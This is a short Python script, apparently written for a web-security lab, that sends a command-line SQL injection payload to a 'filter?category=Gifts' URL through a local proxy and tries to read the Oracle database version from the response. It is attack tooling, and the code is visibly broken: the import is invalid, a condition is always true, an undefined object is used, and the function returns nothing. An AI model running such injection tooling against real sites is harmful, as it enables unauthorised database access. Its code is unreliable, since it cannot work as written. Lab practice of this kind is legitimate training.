import requests
import sys
import urllib3
from bs4 import BeautifulSoup, soup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}
header= {'user-agent':'Mozilla/5.0'}

def dbTypeVersion(url,payload):
    path = 'filter?category=Gifts'
    r    = requests.get(url+path+payload,headers=header,proxies=proxies,verify=False)
    text=r.text
    if "oubuntu" or "" in text:
        parse = BeautifulSoup(text,'html.parser')
        version= soup.find(text=re.compile('.*Oracle\sDatabase.*'))

if __name__== '__main__':
    try:
        base_url=sys.argv[1].strip()
        payloads=sys.argv[2].strip()
    except IndexError:
        print("format = script.py <URL path> <payload>")
    
    if dbTypeVersion(base_url,payloads):
        print('The the database version and type is ' )
    else:
        print("The SQLi injection was not successfull")


